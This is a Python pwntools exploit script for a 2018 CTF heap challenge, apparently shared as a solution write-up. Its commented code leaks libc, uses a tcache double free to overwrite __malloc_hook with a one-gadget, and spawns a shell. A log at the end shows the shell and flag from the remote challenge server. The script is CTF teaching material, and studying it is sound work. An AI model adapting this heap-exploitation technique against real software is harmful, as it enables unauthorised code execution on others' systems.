#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import os

from pwn import *

context(arch="amd64", os="linux")

if not args["REMOTE"]:
    binary = ELF("./slot_machine-x86_64-2.28-4")  # https://github.com/integeruser/bowkin
    libc = ELF("libs/x86_64/4/libc-2.28.so")

    argv = [binary.path]
    envp = {"PWD": os.getcwd()}

    if args["GDB"]:
        io = gdb.debug(
            args=argv,
            env=envp,
            aslr=False,
            terminal=["tmux", "new-window"],
            gdbscript="""
                set follow-fork-mode parent
                continue
            """,
        )
    else:
        io = process(argv=argv, env=envp)
else:
    binary = ELF("./slot_machine")
    libc = ELF("libs/libc-x86_64-2.28-4.so")

    io = remote("arcade.fluxfingers.net", 1815)

# by integeruser and comewel

# TL;DR tcache poisoning due to a double free


def malloc(size):
    io.sendlineafter("[ 4 ] : bye!\n", "1")
    io.sendlineafter("How much?\n", str(size))


def free(where):
    io.sendlineafter("[ 4 ] : bye!\n", "2")
    io.sendlineafter("where?\n", str(where))


def write(what):
    io.sendlineafter("[ 4 ] : bye!\n", "3")
    assert len(what) == 8
    io.sendafter("what?\n", what)


# the address of `system()` is gently given to us directly by the binary
# grab it and calculate the base address of libc
io.recvuntil("Here is system :")
system_addr = int(io.recvline(), 16)
libc.address = system_addr - libc.symbols["system"]
io.success("libc.address: %#x" % libc.address)


# the difficult part of the challenge is that we can do only a limited number
# of operations (coins), e.g. `malloc()`s, `free()`s and writes

# to save a call to `malloc()`, we search the `rw-` mappings from libc for some values
# that can resemble a (fake) chunk

# gef➤  telescope 0x00007ffff7fcc450-0x8
# 0x00007ffff7fcc448│+0x00: 0x0000000000000090
# 0x00007ffff7fcc450│+0x08: 0x0000000000000001

# at `libc.address+0x1C4448` we find the value 0x90, which we can use as the size field
# of the fake chunk starting at `libc.address+0x1C4450`
something_usable_as_a_small_chunk_addr = libc.address + 0x1C4450
# since the binary allows us to call `free()` with any address as argument, we free this fake chunk
free(something_usable_as_a_small_chunk_addr)
# the pointer to the fake chunk is now stored in a tcache bin (call it A)

# and, since the binary allows it, we `free()` the same chunk again (double free)
free(something_usable_as_a_small_chunk_addr)
# the same pointer is stored a second time in tcache (call it B), making the tcache bin circular

# keep in mind that A and B are the same chunk

# now, the next call to `malloc()` (with appropriate size) will return the address of the fake chunk (B)
malloc(0x80)
# since this chunk is also still in tcache, if we edit its content we corrupt the `next` pointer of A
write(p64(libc.symbols["__malloc_hook"]))
# in this case, we set the `next` pointer to `__malloc_hook`

# we call `malloc()` and discard its result (A)
malloc(0x80)

# since we corrupted the `next` pointer of A, the next call to `malloc()` will
# magically return the address of `__malloc_hook`...
malloc(0x80)

# $ one_gadget ./libc-x86_64-2.28-4.so
# . . .
# 0xe75f0 execve("/bin/sh", rsp+0x60, environ)
# constraints:
#   [rsp+0x60] == NULL
# . . .

# ...which we override with the address of the one-gadget
one_gadget_addr = libc.address + 0xE75F0
write(p64(one_gadget_addr))

# using the last coin, we malloc a new chunk, triggering a call to `__malloc_hook`
#  and thus executing the one-gadget
malloc(123)
# and enjoy the shell
io.interactive()
# $ ./slot_machine.py REMOTE
# [*] '/home/vagrant/vbox/Slot-Machine/slot_machine'
#     Arch:     amd64-64-little
#     RELRO:    Partial RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [*] '/home/vagrant/vbox/Slot-Machine/libs/libc-x86_64-2.28-4.so'
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
# [+] Opening connection to arcade.fluxfingers.net on port 1815: Done
# [+] libc.address: 0x7f1594606000
# [*] Switching to interactive mode
# \x89Fc: cannot set terminal process group (23311): Inappropriate ioctl for device
# \x89Fc: no job control in this shell
# [chall@hacklu18 ~]$ $ ls
# flag  slot_machine
# [chall@hacklu18 ~]$ $ cat flag
# flag{eazy_tc4che_forg3ry}
